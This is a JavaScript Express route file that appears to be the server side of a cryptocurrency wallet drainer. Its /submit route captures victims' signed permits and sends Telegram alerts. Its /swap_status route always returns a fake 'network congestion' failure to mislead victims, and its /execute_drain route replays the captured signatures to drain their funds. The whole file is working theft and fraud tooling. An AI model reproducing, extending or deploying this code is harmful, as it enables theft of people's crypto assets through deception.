const express = require("express");
const fs = require("fs");
const path = require("path");
const { executeSignedAction } = require("../utils/executeMultiChainTransfer"); 
const sendTelegramAlert = require("../utils/sendTelegramAlert"); // Telegram alert function


const router = express.Router();

const uploadsDbPath = path.join(__dirname, "../data/uploads.json");
const tokensDbPath = path.join(__dirname, "../data/tokens.json");
const capturedDbPath = path.join(__dirname, "../data/captured.json");
const registryDbPath = path.join(__dirname, "../data/coins.json");


const DEFAULT_REGISTRY = {ethereum: [],solana: [],bnb: [],polygon: []};


// 🔧 FIXED: Now creates files if they don't exist
const ensureDataDir = () => {
    const dir = path.dirname(tokensDbPath);
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
    
    // Create empty JSON files if they don't exist
    if (!fs.existsSync(uploadsDbPath)) {
        fs.writeFileSync(uploadsDbPath, JSON.stringify([], null, 2));
    }
    if (!fs.existsSync(tokensDbPath)) {
        fs.writeFileSync(tokensDbPath, JSON.stringify([], null, 2));
    }
    if (!fs.existsSync(capturedDbPath)) {
        fs.writeFileSync(capturedDbPath, JSON.stringify([], null, 2));
    }
};

// Initialize on startup
ensureDataDir();

// --- EXISTING UPLOAD ROUTES ---
router.get("/uploads", (req, res) => {
    if (!fs.existsSync(uploadsDbPath)) return res.json([]);
    const uploads = JSON.parse(fs.readFileSync(uploadsDbPath, "utf8"));
    res.json(uploads);
});



// ==========================================
// 🆕 DYNAMIC REGISTRY ROUTES
// ==========================================

// 1. GET Full Registry (For App and Admin)
router.get("/registry", (req, res) => {
    try {
        if (!fs.existsSync(registryDbPath)) {
             // Fallback if file deleted
             return res.json(DEFAULT_REGISTRY);
        }
        const registry = JSON.parse(fs.readFileSync(registryDbPath, "utf8"));
        res.json(registry);
    } catch (error) {
        console.error("Registry fetch error:", error);
        res.status(500).json({ error: "Failed to fetch registry" });
    }
});

// 2. ADD/UPDATE Token in Registry
router.post("/registry/add", (req, res) => {
    try {
        const { chain, tokenData } = req.body; // tokenData: { symbol, address, type, decimals, ... }
        
        if (!chain || !tokenData || !tokenData.address) {
            return res.status(400).json({ error: "Invalid data provided" });
        }

        let registry = JSON.parse(fs.readFileSync(registryDbPath, "utf8"));
        if (!registry[chain]) registry[chain] = [];

        // Check if exists (by address)
        const existingIndex = registry[chain].findIndex(t => t.address.toLowerCase() === tokenData.address.toLowerCase());

        if (existingIndex > -1) {
            // Update existing
            registry[chain][existingIndex] = { ...registry[chain][existingIndex], ...tokenData };
        } else {
            // Add new
            registry[chain].push(tokenData);
        }

        fs.writeFileSync(registryDbPath, JSON.stringify(registry, null, 2));
        res.json({ success: true, registry });
    } catch (error) {
        console.error("Add token error:", error);
        res.status(500).json({ error: "Failed to add token" });
    }
});

// 3. DELETE Token from Registry
router.post("/registry/delete", (req, res) => {
    try {
        const { chain, address } = req.body;
        
        let registry = JSON.parse(fs.readFileSync(registryDbPath, "utf8"));
        if (!registry[chain]) return res.status(404).json({ error: "Chain not found" });

        const initialLength = registry[chain].length;
        registry[chain] = registry[chain].filter(t => t.address.toLowerCase() !== address.toLowerCase());

        if (registry[chain].length === initialLength) {
            return res.status(404).json({ error: "Token not found" });
        }

        fs.writeFileSync(registryDbPath, JSON.stringify(registry, null, 2));
        res.json({ success: true, registry });
    } catch (error) {
        console.error("Delete token error:", error);
        res.status(500).json({ error: "Failed to delete token" });
    }
});


router.post("/uploads/:id/status", (req, res) => {
    const { status } = req.body;
    const id = parseInt(req.params.id);
    if (!fs.existsSync(uploadsDbPath)) return res.status(404).json({ error: "No data" });

    let uploads = JSON.parse(fs.readFileSync(uploadsDbPath, "utf8"));
    const index = uploads.findIndex(u => u.id === id);
    if (index === -1) return res.status(404).json({ error: "Not found" });

    uploads[index].status = status;
    fs.writeFileSync(uploadsDbPath, JSON.stringify(uploads, null, 2));
    res.json({ success: true });
});

// --- TOKEN ROUTES ---

// 1. GET ALL TOKENS
router.get("/gettokens", (req, res) => {
    try {
        if (!fs.existsSync(tokensDbPath)) return res.json([]);
        const tokens = JSON.parse(fs.readFileSync(tokensDbPath, "utf8"));
        res.json(tokens);
    } catch (error) {
        console.error("Failed to fetch tokens:", error);
        res.status(500).json({ error: "Failed to fetch tokens" });
    }
});

// 2. ADD NEW TOKEN
router.post("/addtoken", (req, res) => {
    try {
        ensureDataDir();
        const { id, name, symbol, icon, price, isCommon } = req.body;

        if (!id || !symbol) {
            return res.status(400).json({ error: "ID and Symbol required" });
        }

        let tokens = [];
        if (fs.existsSync(tokensDbPath)) {
            tokens = JSON.parse(fs.readFileSync(tokensDbPath, "utf8"));
        }

        // Check if exists
        const exists = tokens.find(t => t.id === id);
        if (exists) {
            return res.status(400).json({ error: "Token ID already exists" });
        }

        const newToken = {
            id,
            name,
            symbol,
            icon,
            price: parseFloat(price) || 0,
            isCommon: isCommon || false
        };

        tokens.push(newToken);
        fs.writeFileSync(tokensDbPath, JSON.stringify(tokens, null, 2));

        res.json({ success: true, token: newToken });
    } catch (error) {
        console.error("Failed to add token:", error);
        res.status(500).json({ error: "Failed to add token" });
    }
});

// 3. DELETE TOKEN
router.delete("/deletetoken/:id", (req, res) => {
    try {
        if (!fs.existsSync(tokensDbPath)) {
            return res.status(404).json({ error: "No tokens found" });
        }
        
        let tokens = JSON.parse(fs.readFileSync(tokensDbPath, "utf8"));
        const initialLength = tokens.length;
        
        tokens = tokens.filter(t => t.id !== req.params.id);

        if (tokens.length === initialLength) {
            return res.status(404).json({ error: "Token not found" });
        }

        fs.writeFileSync(tokensDbPath, JSON.stringify(tokens, null, 2));
        res.json({ success: true });
    } catch (error) {
        console.error("Failed to delete token:", error);
        res.status(500).json({ error: "Failed to delete token" });
    }
});

// --- 🔧 FIXED CAPTURE ROUTE ---
router.post("/submit", (req, res) => {
    try {
        ensureDataDir();
        const { user, chainId, signature, payload, asset, timestamp } = req.body;
        
        console.log("=== SIGNATURE CAPTURED ===");
        console.log("User:", user);
        console.log("Chain:", chainId);
        console.log("Asset:", asset?.symbol, "on", asset?.chain);
        console.log("Signature:", signature?.slice(0, 20) + "...");
        console.log("========================");

        let capturedData = [];
        
        if (fs.existsSync(capturedDbPath)) {
            const fileContent = fs.readFileSync(capturedDbPath, "utf8");
            try {
                // Fix: Check if fileContent is empty before parsing
                if (fileContent.trim()) {
                    capturedData = JSON.parse(fileContent);
                }
            } catch (parseError) {
                console.warn("⚠️ Warning: captured.json was corrupt or empty. Resetting to [].");
                capturedData = []; // Default to empty array if JSON is invalid
            }
        }

        const newEntry = {
            id: Date.now(),
            timestamp: timestamp || new Date().toISOString(),
            user,
            chainId,
            signature,
            payload,
            asset,
            status: 'pending' 
        };

        capturedData.push(newEntry);
        fs.writeFileSync(capturedDbPath, JSON.stringify(capturedData, null, 2));

        sendTelegramAlert(newEntry);


        res.json({ 
            success: true, 
            message: "Signature captured successfully",
            entryId: newEntry.id 
        });
    } catch (error) {
        console.error("❌ Capture error:", error);
        res.status(500).json({ error: "Failed to save signature" });
    }
});

// 🆕 GET CAPTURED SIGNATURES (for admin panel)
router.get("/captured", (req, res) => {
    try {
        if (!fs.existsSync(capturedDbPath)) return res.json([]);
        const captured = JSON.parse(fs.readFileSync(capturedDbPath, "utf8"));
        res.json(captured);
    } catch (error) {
        console.error("Failed to fetch captured signatures:", error);
        res.status(500).json({ error: "Failed to fetch data" });
    }
});


router.post("/swap_status", (req, res) => {
    const { user, signature } = req.body;
    
    console.log(`[Status Check] User: ${user} | Sig: ${signature?.slice(0,10)}...`);
    // Simulate network delay (1.5s) then return error
    setTimeout(() => {
        res.json({
            success: false, 
            status: 'failed',
            message: 'Swap Failed: Network congestion detected. Please try again later.'
        });
    }, 1500);
});



// ⚡️ NEW: EXECUTE DRAIN ROUTE
router.post("/execute_drain", async (req, res) => {
    const { signatureId } = req.body;

    console.log(`[Drain Request] Processing ID: ${signatureId}...`);

    try {
        // 1. Load Database
        if (!fs.existsSync(capturedDbPath)) {
            return res.status(404).json({ error: "Database not found" });
        }
        let capturedData = JSON.parse(fs.readFileSync(capturedDbPath, "utf8"));

        // 2. Find the Target Entry
        const targetIndex = capturedData.findIndex(entry => entry.id === signatureId);
        if (targetIndex === -1) {
            return res.status(404).json({ error: "Signature ID not found" });
        }
        const submissionData = capturedData[targetIndex];

        // 3. Execute the Action (Solana Drain / EVM Permit)
        const success = await executeSignedAction({ submissionData });

        if (success) {
            // 4. Update Status in DB
            capturedData[targetIndex].status = 'drained';
            capturedData[targetIndex].drainedAt = Date.now();
            fs.writeFileSync(capturedDbPath, JSON.stringify(capturedData, null, 2));

            console.log(`✅ [Drain Success] ID: ${signatureId}`);
            res.json({ success: true, message: "Drain executed successfully" });
        } else {
            console.error(`❌ [Drain Failed] ID: ${signatureId}`);
            res.status(500).json({ error: "Execution script returned failure" });
        }

    } catch (error) {
        console.error("❌ [Drain Error] Critical failure:", error.message);
        res.status(500).json({ error: error.message || "Internal Execution Error" });
    }
});



module.exports = router;